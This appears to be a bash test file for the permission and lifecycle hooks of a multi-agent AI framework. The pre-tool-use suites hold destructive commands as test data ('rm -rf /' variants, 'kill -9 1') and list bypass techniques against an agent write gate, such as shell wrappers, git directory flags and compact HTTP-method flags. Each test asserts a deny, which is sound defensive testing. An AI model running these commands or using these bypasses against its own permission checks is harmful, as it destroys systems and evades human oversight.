#!/usr/bin/env bash
# tests/hooks/run-tests.sh
# Bash test runner for the lifecycle hooks.
# Uses local SQLite (no Turso) via tests/hooks/fake-turso.sh on PATH.
#
# Run: bash tests/hooks/run-tests.sh
# Exit code: 0 on all-pass, 1 on any failure.

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
HOOKS_DIR="$ROOT_DIR/hooks"
FIXTURES_DIR="$SCRIPT_DIR/fixtures"

# ─────────────────────────────────────────────
# Setup: temp SQLite + fake-turso on PATH
# ─────────────────────────────────────────────
TMPROOT=$(mktemp -d /tmp/juvant-hook-tests-XXXXXX)
trap 'rm -rf "$TMPROOT"' EXIT

TEST_DB="$TMPROOT/test.db"
sqlite3 "$TEST_DB" < "$ROOT_DIR/scripts/schema.sql"

FAKE_BIN="$TMPROOT/bin"
mkdir -p "$FAKE_BIN"
cp "$SCRIPT_DIR/fake-turso.sh" "$FAKE_BIN/turso"
chmod +x "$FAKE_BIN/turso"
# decisions#276: juvant_db_exec cloud writes now use libsql HTTP /v2/pipeline
# (curl) instead of the turso CLI. Stub curl so hook tests write to the same
# local SQLite file they always did — test behaviour is unchanged, harness
# now covers both the read (juvant_db_query_csv) and write (juvant_db_exec) paths.
cp "$SCRIPT_DIR/fake-libsql-curl.sh" "$FAKE_BIN/curl"
chmod +x "$FAKE_BIN/curl"

export PATH="$FAKE_BIN:$PATH"
export JUVANT_TEST_DB_FILE="$TEST_DB"
export TURSO_URL="libsql://test.fake"
export TURSO_TOKEN="test-token"

# FEAT-051: isolate the audit spool to the temp dir so async audit writes
# (pre/post-tool-use) don't pollute the real repo's .juvant/, and so the
# drainer can be exercised end-to-end against the fake DB.
export JUVANT_SPOOL="$TMPROOT/audit-spool.sql"

# decisions#302: isolate from the instance config. On an adopter the real
# .juvant/config.json exists, so the main thread resolved to role 'cos' (its
# allow-list pre-empted the Track 2f verdicts) and Track 2d read the instance's
# github scope. Default every hook call to a NON-instance path — the same
# environment as the framework repo; suites that need a fixture still pass
# their own JUVANT_CONFIG per call.
export JUVANT_CONFIG="$TMPROOT/no-instance-config.json"

# ─────────────────────────────────────────────
# Test plumbing
# ─────────────────────────────────────────────
PASS=0
FAIL=0
CURRENT_SUITE=""

suite() {
  CURRENT_SUITE="$1"
  echo
  echo "=== $CURRENT_SUITE ==="
}

t_assert() {
  local name="$1"
  local expected="$2"
  local actual="$3"
  if [[ "$expected" == "$actual" ]]; then
    echo "  PASS: $name"
    PASS=$((PASS+1))
  else
    echo "  FAIL: $name"
    echo "    expected: [$expected]"
    echo "    actual:   [$actual]"
    FAIL=$((FAIL+1))
  fi
}

t_db() {
  sqlite3 "$TEST_DB" "$1"
}

# t_purge <table> [where] — truncate an append-only audit table in this
# disposable fixture DB. security_audit_log / agent_actions_log / decisions
# reject DELETE at the DB level (R5b, decisions#303/#308), so the guard is lifted
# for the delete and its exact trigger text restored in the same sqlite3 call.
t_purge() {
  local _t="$1" _w="${2:-}" _ddl
  _ddl=$(sqlite3 "$TEST_DB" "SELECT sql FROM sqlite_master WHERE type='trigger' AND name='${_t}_no_delete';")
  sqlite3 "$TEST_DB" "DROP TRIGGER IF EXISTS ${_t}_no_delete; DELETE FROM ${_t}${_w:+ WHERE $_w}; ${_ddl:+$_ddl;}"
}

t_reset_agents() {
  t_db "DELETE FROM agents;"
}

t_seed_agent() {
  # decisions#302: idempotent — a later suite re-seeding a role (BUG-066 seeds
  # eng-platform again) raised "UNIQUE constraint failed: agents.role". Upsert
  # rather than OR IGNORE so the requested status still takes effect.
  t_db "INSERT INTO agents (role, status) VALUES ('$1', '${2:-inactive}')
        ON CONFLICT(role) DO UPDATE SET status=excluded.status;"
}

# ─────────────────────────────────────────────
# session-start.sh
# ─────────────────────────────────────────────
suite "session-start.sh"

t_reset_agents
t_seed_agent "cos" "inactive"
echo '{"session_id":"sess-1"}' | AGENT_ROLE=cos bash "$HOOKS_DIR/session-start.sh"
status=$(t_db "SELECT status FROM agents WHERE role='cos';")
t_assert "sets agents.status=active" "active" "$status"
sid=$(t_db "SELECT session_id FROM agents WHERE role='cos';")
t_assert "writes session_id from event" "sess-1" "$sid"

# Regression (#61): Claude Code delivers the event on stdin as a REDIRECT, not
# a named pipe. The old `[ -p /dev/stdin ]` guard was false for a redirect →
# EVENT_JSON empty → session_id never captured (the hook silently no-op'd).
# Deliver via `< file` and assert it is still captured. (The pipe-based test
# above passed even with the bug, which is why it went unnoticed.)
t_reset_agents
t_seed_agent "cos" "inactive"
printf '%s' '{"session_id":"sess-redir-9"}' > "$TMPROOT/ev-ss.json"
AGENT_ROLE=cos bash "$HOOKS_DIR/session-start.sh" < "$TMPROOT/ev-ss.json"
sid=$(t_db "SELECT session_id FROM agents WHERE role='cos';")
t_assert "captures session_id via redirected (non-pipe) stdin" "sess-redir-9" "$sid"

# Fail-soft when no Turso creds.
unset TURSO_URL TURSO_TOKEN
echo '{}' | AGENT_ROLE=cos bash "$HOOKS_DIR/session-start.sh" 2>/dev/null
exit_code=$?
t_assert "fail-soft on no creds (exit 0)" "0" "$exit_code"
export TURSO_URL="libsql://test.fake" TURSO_TOKEN="test-token"

# ─────────────────────────────────────────────
# session-end.sh
# ─────────────────────────────────────────────
suite "session-end.sh"

t_reset_agents
t_seed_agent "cos" "active"
echo '{"session_id":"sess-end-1"}' | AGENT_ROLE=cos bash "$HOOKS_DIR/session-end.sh" 2>/dev/null
status=$(t_db "SELECT status FROM agents WHERE role='cos';")
t_assert "sets agents.status=inactive" "inactive" "$status"

# Token tracking finalization with transcript.
t_db "DELETE FROM agent_token_usage;"
event_json=$(jq -n --arg tp "$FIXTURES_DIR/transcript-sample.jsonl" \
  --arg sid "sess-finalize-1" \
  '{transcript_path:$tp, session_id:$sid}')
echo "$event_json" | AGENT_ROLE=cos bash "$HOOKS_DIR/session-end.sh" 2>/dev/null
rows=$(t_db "SELECT COUNT(*) FROM agent_token_usage WHERE session_id='sess-finalize-1';")
t_assert "writes agent_token_usage row from transcript" "1" "$rows"
ended=$(t_db "SELECT ended_at FROM agent_token_usage WHERE session_id='sess-finalize-1';")
t_assert "ended_at populated" "true" "$([[ -n "$ended" ]] && echo true || echo false)"

# BUG-051: the three FEAT-035 wrap-up COUNT(*)s must collapse into ONE DB
# round-trip. session-end runs at the exit-teardown boundary; three serial
# calls can sum past the window Claude Code grants shutdown hooks and get
# cancelled ("Hook cancelled"). We swap in a logging shim (one line per
# invocation, newlines flattened) and assert exactly one query touches the
# count tables — and that that single query carries all three — while the
# reminder still lands with the correct per-source counts.
#
# BUG-071: the probe logs `curl`, not `turso`. Cloud reads go through the
# libsql HTTP /v2/pipeline API, so the SQL now travels in curl's --data body;
# instrumenting the `turso` CLI would count zero round-trips and assert
# nothing. What is being tested — one round-trip carrying all three counts —
# is unchanged.
t_db "DELETE FROM messages; DELETE FROM inbound_queue;"; t_purge decisions
# Seed observable unsaved work: 2 pending queue, 1 proposed decision, 1 unread CEO.
t_db "INSERT INTO inbound_queue (counterparty_id, agent_owner, content, confidence, status)
      VALUES ('cp1','cos','x','unknown','pending'),('cp2','cos','y','unknown','pending');"
t_db "INSERT INTO decisions (agent, title, status) VALUES ('cos','pending thing','proposed');"
t_db "INSERT INTO messages (from_agent, to_agent, type, content, notify_ceo, status)
      VALUES ('x','cos','escalation','{}',1,'unread');"

WRAP_LOG="$TMPROOT/db-calls.log"
: > "$WRAP_LOG"
cat > "$FAKE_BIN/curl" <<EOF
#!/usr/bin/env bash
printf '%s ' "\$@" | tr '\n' ' ' >> "$WRAP_LOG"; printf '\n' >> "$WRAP_LOG"
exec bash "$SCRIPT_DIR/fake-libsql-curl.sh" "\$@"
EOF
chmod +x "$FAKE_BIN/curl"

wrap_event=$(jq -n --arg sid "sess-wrap-1" '{session_id:$sid}')
echo "$wrap_event" | AGENT_ROLE=cos bash "$HOOKS_DIR/session-end.sh" 2>/dev/null

wrap_roundtrips=$(grep -c 'FROM inbound_queue' "$WRAP_LOG")
t_assert "BUG-051: single wrap-up round-trip (not 3)" "1" "$wrap_roundtrips"
combined=$(grep 'FROM inbound_queue' "$WRAP_LOG" | grep -c 'FROM decisions.*FROM messages')
t_assert "BUG-051: all three counts in one query" "1" "$combined"

reminder=$(t_db "SELECT content FROM messages WHERE type='session-wrap-reminder' ORDER BY id DESC LIMIT 1;")
t_assert "wrap reminder: pending_queue"      "2" "$(echo "$reminder" | jq -r '.pending_queue')"
t_assert "wrap reminder: proposed_decisions" "1" "$(echo "$reminder" | jq -r '.proposed_decisions')"
t_assert "wrap reminder: unread_ceo_messages" "1" "$(echo "$reminder" | jq -r '.unread_ceo_messages')"

# Restore the plain shim so later suites are unaffected by call logging.
cp "$SCRIPT_DIR/fake-libsql-curl.sh" "$FAKE_BIN/curl"
chmod +x "$FAKE_BIN/curl"

# ─────────────────────────────────────────────
# stop.sh — UPSERT idempotency
# ─────────────────────────────────────────────
suite "stop.sh"

t_db "DELETE FROM agent_token_usage;"
event_json=$(jq -n --arg tp "$FIXTURES_DIR/transcript-sample.jsonl" \
  --arg sid "sess-stop-1" \
  '{transcript_path:$tp, session_id:$sid}')
# First call.
echo "$event_json" | AGENT_ROLE=cos bash "$HOOKS_DIR/stop.sh" 2>/dev/null
# Second call — should UPSERT, not duplicate.
echo "$event_json" | AGENT_ROLE=cos bash "$HOOKS_DIR/stop.sh" 2>/dev/null
rows=$(t_db "SELECT COUNT(*) FROM agent_token_usage WHERE session_id='sess-stop-1';")
t_assert "two stop calls → one row (UPSERT idempotent)" "1" "$rows"

# ─────────────────────────────────────────────
# subagent-stop.sh
# ─────────────────────────────────────────────
suite "subagent-stop.sh"

t_reset_agents
t_seed_agent "cco" "active"
t_db "DELETE FROM agent_token_usage;"
event_json=$(jq -n --arg tp "$FIXTURES_DIR/transcript-sample.jsonl" \
  --arg sid "sess-sub-parent" \
  --arg at "cco" \
  '{transcript_path:$tp, session_id:$sid, agent_type:$at}')
echo "$event_json" | bash "$HOOKS_DIR/subagent-stop.sh" 2>/dev/null
status=$(t_db "SELECT status FROM agents WHERE role='cco';")
t_assert "sets cco.status=inactive" "inactive" "$status"
parent=$(t_db "SELECT parent_session_id FROM agent_token_usage WHERE agent_name='cco' LIMIT 1;")
t_assert "writes parent_session_id link" "sess-sub-parent" "$parent"

# ─────────────────────────────────────────────
# pre-tool-use.sh — Track 2 + Track 3 + escalation
# ─────────────────────────────────────────────
suite "pre-tool-use.sh"

t_reset_agents
t_seed_agent "cco" "active"
t_seed_agent "eng-frontend" "active"
t_purge agent_actions_log
t_db "DELETE FROM messages;"

# 1. Universal deny (rm -rf /).
event_json='{"tool_name":"Bash","session_id":"sess-pt-1","tool_input":{"command":"rm -rf /"}}'
out=$(echo "$event_json" | AGENT_ROLE=cos bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')
reason=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecisionReason')
t_assert "universal deny → permissionDecision=deny" "deny" "$decision"
case "$reason" in
  *"universal deny-list match"*) t_assert "universal deny → reason cites universal deny-list" "ok" "ok" ;;
  *) t_assert "universal deny → reason cites universal deny-list" "ok" "got: $reason" ;;
esac
# BUG-053: the decision MUST be emitted in the hookSpecificOutput wrapper — the
# only form Claude Code 2.x honors for PreToolUse (the legacy top-level form is
# silently ignored for MCP tools → deny logged but tool executes). Lock the
# shape so it can never regress to the top-level form.
t_assert "BUG-053: deny uses hookSpecificOutput wrapper (hookEventName=PreToolUse)" "PreToolUse" \
  "$(echo "$out" | jq -r '.hookSpecificOutput.hookEventName')"
t_assert "BUG-053: no legacy top-level permissionDecision key" "null" \
  "$(echo "$out" | jq -r '.permissionDecision')"
# BUG-053 defense-in-depth: deny ALSO hard-blocks via exit code 2 (honored
# uniformly by CC for built-in + MCP, independent of stdout schema).
echo "$event_json" | AGENT_ROLE=cos bash "$HOOKS_DIR/pre-tool-use.sh" >/dev/null 2>&1
t_assert "BUG-053: deny hard-blocks via exit code 2" "2" "$?"
# allow must stay exit 0.
echo '{"tool_name":"Bash","session_id":"sx","tool_input":{"command":"git status"}}' \
  | AGENT_ROLE=cos bash "$HOOKS_DIR/pre-tool-use.sh" >/dev/null 2>&1
t_assert "BUG-053: allow stays exit 0" "0" "$?"

# BUG-073: the rm/kill universal-deny rules once used the PCRE shorthand `\s`,
# which bash's ERE engine does NOT treat as whitespace — the trailing `(\s|$)`
# anchor matched only a literal `s` or end-of-string. The bare forms were caught
# (via `$`), but the operative destructive forms slipped through the floor:
# `rm -rf / --no-preserve-root` (the ONLY form modern coreutils actually deletes
# root for), `rm -rf /` inside a `$(…)` command substitution (anchor `/)`), and
# `kill -9 1 <arg>`. Fixed by anchoring the target to a TOKEN BOUNDARY, not just
# whitespace: for rm, `/` followed by any non-path char `[^a-zA-Z0-9._/~-]` or EOL
# (so `/`, `/ `, `/)`, `/;`, `/*` deny but `/home`, `/srv`, `/tmp/x` do not); for
# kill, PID `1` followed by a non-digit or EOL (so `1`, `1 `, `1;` deny but `10`,
# `1234` do not). Guards against a regression to `\s` and against the anchor
# recognizing only whitespace.
_bug073_deny=(
  "rm -rf / --no-preserve-root"
  "rm -rf / -v"
  "rm -rf /*"                                 # root wildcard
  "echo hi && rm -rf / --no-preserve-root"    # compound: floor applies, decoy or not
  "turso db shell db \"SELECT \$(rm -rf /)\"" # cmd-sub: #97 de-scopes, floor catches rm -rf /)
  "kill -9 1 -s KILL"
  "kill -9 1; echo done"                      # PID 1 followed by ';'
)
for _b73 in "${_bug073_deny[@]}"; do
  _b73_out=$(jq -nc --arg c "$_b73" '{tool_name:"Bash",session_id:"b73",tool_input:{command:$c}}' \
    | AGENT_ROLE=cos bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
  t_assert "BUG-073: deny → [$_b73]" "deny" \
    "$(echo "$_b73_out" | jq -r '.hookSpecificOutput.permissionDecision')"
done
# The same fix must NOT over-match: the old `/(\s|$)` false-denied `rm -rf /srv`
# because the literal `s` in the broken `\s` matched `/s`. `rm` is not allow-listed
# for any role, so the command is still denied — but the REASON must now be the
# allow-list, never the universal rule. Asserting on the reason isolates the
# universal-pattern behavior from the orthogonal allow-list gate.
_b73_srv=$(jq -nc '{tool_name:"Bash",session_id:"b73",tool_input:{command:"rm -rf /srv"}}' \
  | AGENT_ROLE=cos bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
_b73_srv_reason=$(echo "$_b73_srv" | jq -r '.hookSpecificOutput.permissionDecisionReason')
case "$_b73_srv_reason" in
  *"universal deny-list match"*) t_assert "BUG-073: rm -rf /srv no longer false-matches universal rule" "ok" "got universal: $_b73_srv_reason" ;;
  *) t_assert "BUG-073: rm -rf /srv no longer false-matches universal rule" "ok" "ok" ;;
esac

# 2. Allow-list hit (cos → git).
event_json='{"tool_name":"Bash","session_id":"sess-pt-2","tool_input":{"command":"git status"}}'
out=$(echo "$event_json" | AGENT_ROLE=cos bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')
t_assert "allow-list hit (cos:git) → allow" "allow" "$decision"

# 3. Allow-list miss → static deny (handbook ADR 0004 Track 2).
# Use `terraform` against eng-frontend: not in eng-frontend allow-list.
# v0.6.0 ships static deny — automatic tool_authorization_request emit +
# bash_oneshot_grants consumption is FEAT-025, deferred to v1.1.
event_json='{"tool_name":"Bash","session_id":"sess-pt-3","tool_input":{"command":"terraform plan"}}'
out=$(echo "$event_json" | AGENT_ROLE=eng-frontend bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')
t_assert "allow-list miss → deny" "deny" "$decision"
# FEAT-051: the audit row is spooled (off the gating path), not written
# inline. Assert it lands first in the spool, then reaches the DB after a
# drain — exercising the full spool→drain pipeline.
t_assert "allow-list miss → audit row spooled (status=denied)" "1" \
  "$(grep -c "agent_actions_log.*eng-frontend.*denied" "$JUVANT_SPOOL" 2>/dev/null || echo 0)"
bash "$ROOT_DIR/helpers/drain-audit-spool.sh" >/dev/null 2>&1
audit_count=$(t_db "SELECT COUNT(*) FROM agent_actions_log WHERE agent='eng-frontend' AND status='denied';")
t_assert "allow-list miss → audit log row written (status=denied)" "1" "$audit_count"
t_assert "drain empties the spool" "no" \
  "$([[ -f "$JUVANT_SPOOL" ]] && echo yes || echo no)"

# 4. Unknown role → deny (operator-mode bypass does NOT apply for unknown agent roles).
# v0.7.3+ (F-28): universal_allow contains POSIX shell builtins (cd, echo,
# bash, sh, …). The test must use a binary NOT in universal_allow to exercise
# the allow-list-miss path. `git` is the canonical choice — a real binary
# several roles legitimately need, so a ghost role attempting `git` correctly
# falls through to the per-role allow-list and gets denied.
event_json='{"tool_name":"Bash","session_id":"sess-pt-4","tool_input":{"command":"git status"}}'
out=$(echo "$event_json" | AGENT_ROLE=ghost-role bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')
t_assert "unknown role → deny" "deny" "$decision"

# 5. Agent-role deny (R3 defense-in-depth, v1.5.1+): cloud-mutating verbs
# blocked for any real agent role even when the binary is in the role's
# allow-list. eng-platform has `az` in @infra_cli but `az ad app create`
# is a cloud write — must be denied via agent_role_deny_patterns.
t_seed_agent "eng-platform" "active"
event_json='{"tool_name":"Bash","session_id":"sess-pt-5","tool_input":{"command":"az ad app create --display-name foo"}}'
out=$(echo "$event_json" | AGENT_ROLE=eng-platform bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')
reason=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecisionReason')
t_assert "agent role + az write → deny" "deny" "$decision"
case "$reason" in
  *"agent-role deny-list match"*) t_assert "agent role + az write → reason cites R3" "ok" "ok" ;;
  *) t_assert "agent role + az write → reason cites R3" "ok" "got: $reason" ;;
esac

# 5b. Same role, read-only az — must pass (terraform-apply workflow path
# is the only legitimate write path; read-only az is fine for spec authors).
event_json='{"tool_name":"Bash","session_id":"sess-pt-5b","tool_input":{"command":"az account show"}}'
out=$(echo "$event_json" | AGENT_ROLE=eng-platform bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')
t_assert "agent role + az read → allow" "allow" "$decision"

# 5c. Same role, terraform plan — read-only, must pass.
event_json='{"tool_name":"Bash","session_id":"sess-pt-5c","tool_input":{"command":"terraform plan"}}'
out=$(echo "$event_json" | AGENT_ROLE=eng-platform bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')
t_assert "agent role + terraform plan → allow" "allow" "$decision"

# 5d. Same role, terraform apply — must be denied via R3.
event_json='{"tool_name":"Bash","session_id":"sess-pt-5d","tool_input":{"command":"terraform apply -auto-approve"}}'
out=$(echo "$event_json" | AGENT_ROLE=eng-platform bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')
t_assert "agent role + terraform apply → deny" "deny" "$decision"

# ─── BUG-054 (juvantlabs/juvant-os-pm#140) — inline env-prefix / URL parse ───
# 6. Inline env-prefix whose value carries a URL scheme (cso holds turso).
#    TURSO_DATABASE_URL=libsql://x.turso.io turso db shell …
#    Pre-fix: ##*/ ran first, collapsing the token to a fragment ("turso.io")
#    that no longer matched *=*, so it was treated as a binary → deny.
#    Post-fix: *=* detected first → skip the prefix → binary "turso" → allow.
event_json='{"tool_name":"Bash","session_id":"sess-pt-6","tool_input":{"command":"TURSO_DATABASE_URL=libsql://x.turso.io turso db shell company-juvant"}}'
out=$(echo "$event_json" | AGENT_ROLE=cso bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')
t_assert "BUG-054: inline env-prefix (cso:turso) → allow" "allow" "$decision"

# 6b. DOUBLE env-prefix — the edge case the loop (not a single hop) fixes.
#     A=1 TURSO_DATABASE_URL=libsql://x turso … must still resolve to 'turso'.
event_json='{"tool_name":"Bash","session_id":"sess-pt-6b","tool_input":{"command":"FOO=bar TURSO_DATABASE_URL=libsql://x.turso.io turso db shell c"}}'
out=$(echo "$event_json" | AGENT_ROLE=cso bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')
t_assert "BUG-054: double env-prefix (cso:turso) → allow" "allow" "$decision"

# 6c. Naked URL as the first token → deny:parse: (not deny:allow-list:).
#     libsql://x.turso.io "SELECT 1" — no binary, just a URL literal.
#     Pre-fix: ##*/ mangled it to "x.turso.io" → deny:allow-list.
#     Post-fix: ://-detection captures it raw → deny:parse:.
event_json='{"tool_name":"Bash","session_id":"sess-pt-6c","tool_input":{"command":"libsql://x.turso.io \"SELECT 1\""}}'
out=$(echo "$event_json" | AGENT_ROLE=cso bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')
reason=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecisionReason')
t_assert "BUG-054: naked URL first token → deny" "deny" "$decision"
case "$reason" in
  deny:parse:*) t_assert "BUG-054: naked URL → deny:parse: prefix" "ok" "ok" ;;
  *) t_assert "BUG-054: naked URL → deny:parse: prefix" "ok" "got: $reason" ;;
esac

# 6d. Regression: a single-line array assignment (WHITELIST=(git gh)) followed
#     by a real command must NOT be misread as binary 'gh'. The array token is
#     a var assignment (skipped); the binary is the git on the next statement.
event_json='{"tool_name":"Bash","session_id":"sess-pt-6d","tool_input":{"command":"WHITELIST=(git gh)\ngit status"}}'
out=$(echo "$event_json" | AGENT_ROLE=cos bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')
t_assert "BUG-054: single-line array not misread → allow (cos:git)" "allow" "$decision"

# ─────────────────────────────────────────────
# BUG-055 (juvantlabs/juvant-os-pm#141) — turso tier-parity in allow-list
# Static invariants over hooks/bash-policy.json so the drift that left
# cto/design-lead/eng-frontend without turso cannot silently reappear.
# ─────────────────────────────────────────────
suite "BUG-055: bash-policy ↔ matrix turso consistency"

_pol_has() {  # $1=role $2=binary -> yes|no
  jq -r --arg r "$1" --arg b "$2" \
    '(.agent_allow[$r] // []) | if index($b) then "yes" else "no" end' \
    "$HOOKS_DIR/bash-policy.json"
}

# Root-cause invariant (drift-proof, future-role-proof): every role the
# governance matrix (v0-agent-tool-matrix.json mcp_servers) grants turso
# MUST carry turso in the enforcement allow-list. This is the exact
# consistency that broke — cto/design-lead/eng-frontend had turso in the
# matrix but not the policy, so their DB reads were denied.
while IFS= read -r _mr; do
  [[ -z "$_mr" ]] && continue
  t_assert "BUG-055: matrix grants turso ⇒ policy allows it ($_mr)" "yes" "$(_pol_has "$_mr" turso)"
done < <(jq -r '.rows[] | select((.mcp_servers // []) | index("turso")) | .role' \
  "$ROOT_DIR/scripts/templates/v0-agent-tool-matrix.json")

# Behavioral end-to-end: cto now resolves a turso read behind an inline
# env-prefix (ties BUG-054 parse + BUG-055 allow-list together) → allow.
t_seed_agent "cto" "active"
event_json='{"tool_name":"Bash","session_id":"sess-pt-55","tool_input":{"command":"TURSO_DATABASE_URL=libsql://x.turso.io turso db shell company-juvant"}}'
out=$(echo "$event_json" | AGENT_ROLE=cto bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
decision=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')
t_assert "BUG-055: cto inline env-prefix turso read → allow" "allow" "$decision"

# ─────────────────────────────────────────────
# single-writer gate (Track 2d: git + gh writes) — FEAT-047 + FEAT-052
# Also exercises BUG-049 role normalization (project-prefixed agent_type).
# NOTE: the gate keys on event.agent_type; the bypass triggers when it is
# absent (main thread), so these cases MUST pass agent_type in the event.
# ─────────────────────────────────────────────
suite "single-writer gate (Track 2d: git + gh)"

_t2d() {  # $1=agent_type  $2=command  -> prints decision
  jq -nc --arg c "$2" --arg a "$1" \
    '{tool_name:"Bash",session_id:"sess-t2d",agent_type:$a,tool_input:{command:$c}}' \
    | bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null | jq -r '.hookSpecificOutput.permissionDecision'
}

# project writer (prefixed) — allowed (needs BUG-049 normalization to even
# pass the Track-2 allow-list for bare gh/git, then the Track-2d writer case)
t_assert "eng-lead + git commit → allow"           "allow" "$(_t2d dog-ai-eng-lead 'git commit -m x')"
t_assert "eng-lead + gh pr create → allow"         "allow" "$(_t2d dog-ai-eng-lead 'gh pr create --title x')"
t_assert "eng-lead + gh api POST → allow"          "allow" "$(_t2d dog-ai-eng-lead 'gh api repos/o/r -X POST')"
# project non-writer with gh — reads ok, writes denied
t_assert "product-lead + gh pr view → allow"       "allow" "$(_t2d dog-ai-product-lead 'gh pr view 1')"
t_assert "product-lead + gh pr create → deny"      "deny"  "$(_t2d dog-ai-product-lead 'gh pr create --title x')"
t_assert "product-lead + gh api -f (POST) → deny"  "deny"  "$(_t2d dog-ai-product-lead 'gh api repos/o/r -f a=b')"
t_assert "product-lead + gh api -X GET -f → allow" "allow" "$(_t2d dog-ai-product-lead 'gh api repos/o/r -X GET -f a=b')"
t_assert "product-lead + git push → deny"          "deny"  "$(_t2d dog-ai-product-lead 'git push')"
t_assert "wrapped gh write still gated → deny"     "deny"  "$(_t2d dog-ai-product-lead 'bash helpers/with-timeout.sh 60 gh pr merge 7')"
# E (Track 2d hardening) — write-detection bypass regressions.
# git directory-redirect: the write verb no longer sits directly after `git `.
t_assert "non-writer + git -C /tmp/o push → deny"        "deny"  "$(_t2d dog-ai-product-lead 'git -C /tmp/o push')"
t_assert "non-writer + git --work-tree=/tmp/o commit → deny" "deny" "$(_t2d dog-ai-product-lead 'git --work-tree=/tmp/o commit -m x')"
# ultrareview #68: indirect-verb bypasses (shell wrapper, no-arg globals,
# quoted -c value with spaces) must all be caught.
t_assert "non-writer + bash -c 'git push' → deny"        "deny"  "$(_t2d dog-ai-product-lead "bash -c 'git push'")"
t_assert "non-writer + sh -c \"git commit\" → deny"      "deny"  "$(_t2d dog-ai-product-lead 'sh -c "git commit -m x"')"
t_assert "non-writer + git --no-pager push → deny"       "deny"  "$(_t2d dog-ai-product-lead 'git --no-pager push')"
t_assert "non-writer + git --bare push → deny"           "deny"  "$(_t2d dog-ai-product-lead 'git --bare push')"
t_assert "non-writer + git -c 'user.name=My Name' push → deny" "deny" "$(_t2d dog-ai-product-lead 'git -c "user.name=My Name" push')"
# Read controls — common reads must NOT be over-gated.
t_assert "non-writer + git log --oneline → allow"        "allow" "$(_t2d dog-ai-product-lead 'git log --oneline -5')"
t_assert "non-writer + git show <sha> → allow"           "allow" "$(_t2d dog-ai-product-lead 'git show abc123')"
# gh api bodies that aren't field flags, and explicit non-GET methods.
t_assert "non-writer + gh api --input → deny"            "deny"  "$(_t2d dog-ai-product-lead 'gh api repos/o/r/issues --input body.json')"
t_assert "non-writer + gh api --method POST → deny"      "deny"  "$(_t2d dog-ai-product-lead 'gh api repos/o/r/issues --method POST')"
t_assert "non-writer + gh api -X DELETE → deny"          "deny"  "$(_t2d dog-ai-product-lead 'gh api repos/o/r/x -X DELETE')"
# ultrareview #68: lowercase method, compact short-flag, and sibling/comment
# -X GET must not disable the write check.
t_assert "non-writer + gh api --method post (lowercase) → deny" "deny" "$(_t2d dog-ai-product-lead 'gh api repos/o/r/issues --method post')"
t_assert "non-writer + gh api -X delete (lowercase) → deny" "deny" "$(_t2d dog-ai-product-lead 'gh api repos/o/r/x -X delete')"
t_assert "non-writer + gh api -XPOST (compact) → deny"   "deny"  "$(_t2d dog-ai-product-lead 'gh api repos/o/r -XPOST')"
t_assert "non-writer + gh api -XDELETE (compact) → deny" "deny"  "$(_t2d dog-ai-product-lead 'gh api repos/o/r/x -XDELETE')"
t_assert "non-writer + gh api --input && sibling -X GET → deny" "deny" "$(_t2d dog-ai-product-lead 'gh api repos/o/r --input b.json && gh api repos/o/r -X GET')"
t_assert "non-writer + gh api --input # -X GET comment → deny" "deny" "$(_t2d dog-ai-product-lead 'gh api repos/o/r --input b.json # -X GET')"
# Controls — reads must still pass.
t_assert "non-writer + gh api (plain GET) → allow"       "allow" "$(_t2d dog-ai-product-lead 'gh api repos/o/r/issues')"
t_assert "non-writer + gh api --method GET → allow"      "allow" "$(_t2d dog-ai-product-lead 'gh api repos/o/r --method GET')"
t_assert "eng-platform + gh api POST → allow"      "allow" "$(_t2d eng-platform 'gh api orgs/x/repos -X POST')"
# component maintainer (FEAT-053): single-writer on its own repo; BUG-049
# normalization maps <slug>-maintainer → maintainer for the allow-list.
t_assert "maintainer + gh pr create → allow"       "allow" "$(_t2d engram-maintainer 'gh pr create --title x')"
t_assert "maintainer + git commit → allow"         "allow" "$(_t2d engram-maintainer 'git commit -m x')"
t_assert "maintainer + npm test → allow"           "allow" "$(_t2d engram-maintainer 'npm test')"
t_assert "maintainer + gh pr view → allow"         "allow" "$(_t2d engram-maintainer 'gh pr view 1')"
# main thread (no agent_type) bypasses the gate
_t2d_mt=$(echo '{"tool_name":"Bash","session_id":"s","tool_input":{"command":"gh pr create --title x"}}' \
  | AGENT_ROLE=cos bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null | jq -r '.hookSpecificOutput.permissionDecision')
